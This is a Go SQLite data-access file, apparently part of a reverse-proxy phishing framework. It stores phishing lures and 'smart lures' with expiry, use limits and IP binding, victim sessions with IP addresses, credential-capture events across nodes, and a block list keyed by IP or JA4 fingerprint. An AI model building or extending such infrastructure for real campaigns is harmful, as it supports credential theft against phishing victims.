package sqlite

import (
	"time"

	"github.com/google/uuid"
)

// DAO — только факты, без plaintext (vault отклонен решением).
func (d *DB) InsertLure(phishletID, path string) error {
	_, err := d.sql.Exec(`INSERT OR IGNORE INTO lures(id,phishlet_id,path,created_at) VALUES(?,?,?,?)`,
		uuid.NewString(), phishletID, path, time.Now().Unix())
	return err
}

func (d *DB) InsertSession(id, phishletID, ip string) error {
	_, err := d.sql.Exec(`INSERT OR IGNORE INTO sessions(id,phishlet_id,ip,created_at) VALUES(?,?,?,?)`,
		id, phishletID, ip, time.Now().Unix())
	return err
}

func (d *DB) InsertCapture(sessionID, kind string) error {
	return d.InsertCaptureNode(sessionID, kind, "")
}

// InsertCaptureNode пишет факт захвата с node_id (мульти-нода).
func (d *DB) InsertCaptureNode(sessionID, kind, node string) error {
	_, err := d.sql.Exec(`INSERT INTO captures(id,session_id,kind,created_at,node) VALUES(?,?,?,?,?)`,
		uuid.NewString(), sessionID, kind, time.Now().Unix(), node)
	return err
}

func (d *DB) InsertBlock(key, reason string) error {
	_, err := d.sql.Exec(`INSERT OR REPLACE INTO blacklist(ip_or_ja4,reason) VALUES(?,?)`, key, reason)
	return err
}

func (d *DB) ListLures() (map[string]string, error) {
	rows, err := d.sql.Query(`SELECT phishlet_id,path FROM lures`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := map[string]string{}
	for rows.Next() {
		var pid, path string
		if err := rows.Scan(&pid, &path); err != nil {
			return nil, err
		}
		out[path] = pid
	}
	return out, rows.Err()
}

func (d *DB) ListBlocks() (map[string]string, error) {
	rows, err := d.sql.Query(`SELECT ip_or_ja4,reason FROM blacklist`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := map[string]string{}
	for rows.Next() {
		var k, r string
		if err := rows.Scan(&k, &r); err != nil {
			return nil, err
		}
		out[k] = r
	}
	return out, rows.Err()
}

func (d *DB) CountCaptures() (int, error) {
	var n int
	err := d.sql.QueryRow(`SELECT COUNT(*) FROM captures`).Scan(&n)
	return n, err
}

// SmartLureRow — строка smart-приманки.
type SmartLureRow struct {
	Path             string
	PhishletID       string
	ExpiresAt        int64
	MaxUses          int
	Uses             int
	BoundIP          string
	RequireChallenge bool
}

func (d *DB) UpsertSmartLure(r SmartLureRow) error {
	_, err := d.sql.Exec(`INSERT INTO smart_lures(path,phishlet_id,expires_at,max_uses,uses,bound_ip,require_challenge)
VALUES(?,?,?,?,?,?,?) ON CONFLICT(path) DO UPDATE SET phishlet_id=excluded.phishlet_id,expires_at=excluded.expires_at,max_uses=excluded.max_uses,bound_ip=excluded.bound_ip,require_challenge=excluded.require_challenge`,
		r.Path, r.PhishletID, r.ExpiresAt, r.MaxUses, r.Uses, r.BoundIP, boolInt(r.RequireChallenge))
	return err
}

func (d *DB) ListSmartLures() ([]SmartLureRow, error) {
	rows, err := d.sql.Query(`SELECT path,phishlet_id,expires_at,max_uses,uses,bound_ip,require_challenge FROM smart_lures`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []SmartLureRow
	for rows.Next() {
		var r SmartLureRow
		var rc int
		if err := rows.Scan(&r.Path, &r.PhishletID, &r.ExpiresAt, &r.MaxUses, &r.Uses, &r.BoundIP, &rc); err != nil {
			return nil, err
		}
		r.RequireChallenge = rc != 0
		out = append(out, r)
	}
	return out, rows.Err()
}

func boolInt(b bool) int {
	if b {
		return 1
	}
	return 0
}
